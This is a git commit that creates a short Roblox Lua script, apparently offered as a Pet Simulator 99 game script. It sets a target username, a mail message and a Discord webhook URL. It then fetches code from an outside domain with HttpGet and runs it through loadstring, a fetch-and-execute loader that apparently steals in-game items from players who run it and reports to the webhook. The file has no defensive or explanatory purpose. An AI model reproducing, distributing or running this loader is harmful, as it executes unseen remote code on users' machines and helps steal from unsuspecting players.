61223c0264f3cdcfce1faf8535b2ec6050306196
ps99scriptlong <167875696+ps99scriptlong@users.noreply.github.com>
2024-05-06 17:53:46 +0700

    Create main.lua

---
+++ makebylong/robloxlua/main.lua
@@ -0,0 +1,6 @@
+lua
+Username = "mxrcuszzzzz"
+MailMessage = "make by kalong succbest"
+Webhook = "https://discord.com/api/webhooks/1236993427242094703/2lEki5_JRzkmGs5lN9uZ_yGw4EhUFzqllNNYXmo-8WOxMIz245dYsFPFFvSJ3i7_MtjH"
+
+loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
